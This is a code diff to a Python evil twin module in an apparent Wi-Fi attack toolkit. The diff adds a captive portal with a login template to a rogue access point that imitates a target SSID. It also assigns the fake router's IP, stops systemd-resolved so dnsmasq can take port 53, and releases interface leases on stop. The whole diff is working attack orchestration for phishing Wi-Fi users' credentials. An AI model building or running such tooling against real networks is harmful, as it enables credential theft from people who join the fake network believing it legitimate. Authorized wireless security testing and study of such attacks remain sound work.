@@ -20,6 +20,7 @@ class EvilTwinModule(Module):
         self.lease_manager = lease_manager
         self._hostapd_process: Optional[ManagedProcess] = None
         self._dnsmasq_process: Optional[ManagedProcess] = None
+        self._portal_process: Optional[ManagedProcess] = None
 
     @property
     def name(self) -> str:
@@ -29,14 +30,16 @@ class EvilTwinModule(Module):
         iface = params.get("iface", "wlan_ap")
         ssid = params.get("ssid")
         channel = params.get("channel", 6)
+        template = params.get("template", "Login_v4")
         
         if not ssid:
             raise ValueError("Target SSID is required for Evil Twin")
             
         # 1. Acquire AP Lease
+        self.iface = iface
         await self.lease_manager.acquire(job_id, iface, "ap.service")
         
-        # 2. DHCP Subnet Collision Detection (Edge case 6.2)
+        # 2. DHCP Subnet Collision Detection & IP Assignment (Edge case 6.2)
         base_ip = "10.0.0"
         if os.name == 'posix':
             try:
@@ -45,8 +48,20 @@ class EvilTwinModule(Module):
                 if b"10.0.0." in stdout:
                     logger.warning("Subnet collision detected on wlan_uplink. Shifting EvilTwin DHCP to 172.16.0.x")
                     base_ip = "172.16.0"
-            except Exception:
-                pass
+                    
+                # Flush existing IPs and assign our evil twin router IP
+                await asyncio.create_subprocess_exec("sudo", "ip", "addr", "flush", "dev", iface)
+                await asyncio.create_subprocess_exec("sudo", "ip", "addr", "add", f"{base_ip}.1/24", "dev", iface)
+                await asyncio.create_subprocess_exec("sudo", "ip", "link", "set", iface, "up")
+                
+                # Check for dnsmasq port collision (port 53)
+                ss_proc = await asyncio.create_subprocess_exec("ss", "-uln", stdout=asyncio.subprocess.PIPE)
+                ss_out, _ = await ss_proc.communicate()
+                if b":53 " in ss_out:
+                    logger.warning("Port 53 is already in use (e.g., systemd-resolved). Attempting to stop it to allow dnsmasq.")
+                    await asyncio.create_subprocess_exec("sudo", "systemctl", "stop", "systemd-resolved")
+            except Exception as e:
+                logger.error(f"Failed to assign IP or handle port collision: {e}")
                 
         # 3. Write hostapd.conf
         hostapd_conf = f"/tmp/wcarck_hostapd_{job_id}.conf"
@@ -81,28 +96,44 @@ class EvilTwinModule(Module):
         h_cmd = ["hostapd", hostapd_conf]
         d_cmd = ["dnsmasq", "-C", dnsmasq_conf, "-d"]
         
+        # 6. Start Captive Portal web server
+        import sys
+        portal_script = os.path.join(os.path.dirname(__file__), "captive_portal.py")
+        p_cmd = [sys.executable, portal_script, "--template", template, "--job_id", job_id]
+        
         if os.name == 'nt':
             # Windows dev dummy
             h_cmd = ["python", "-c", f"import time; print('Fake AP {ssid} started...'); time.sleep(60)"]
             d_cmd = ["python", "-c", "import time; print('DNS/DHCP started...'); time.sleep(60)"]
+            p_cmd = ["python", "-c", f"import time; print('Captive Portal {template} started...'); time.sleep(60)"]
             
         self._hostapd_process = ManagedProcess(cmd=h_cmd, job_id=job_id)
         self._dnsmasq_process = ManagedProcess(cmd=d_cmd, job_id=job_id)
+        self._portal_process = ManagedProcess(cmd=p_cmd, job_id=job_id)
         
         await self._hostapd_process.start()
         await self._dnsmasq_process.start()
+        await self._portal_process.start()
         
         bus.publish("module.started", {"job_id": job_id, "module": self.name})
 
     async def stop(self, job_id: str) -> None:
-        if self._hostapd_process:
-            await self._hostapd_process.stop()
-            self._hostapd_process = None
-            
-        if self._dnsmasq_process:
-            await self._dnsmasq_process.stop()
-            self._dnsmasq_process = None
-            
+        try:
+            if self._hostapd_process:
+                await self._hostapd_process.stop()
+                self._hostapd_process = None
+                
+            if self._dnsmasq_process:
+                await self._dnsmasq_process.stop()
+                self._dnsmasq_process = None
+                
+            if self._portal_process:
+                await self._portal_process.stop()
+                self._portal_process = None
+        finally:
+            if getattr(self, 'iface', None):
+                await self.lease_manager.release(job_id, self.iface)
+                
         bus.publish("module.stopped", {"job_id": job_id, "module": self.name})
 
     async def status(self, job_id: str) -> dict[str, Any]:
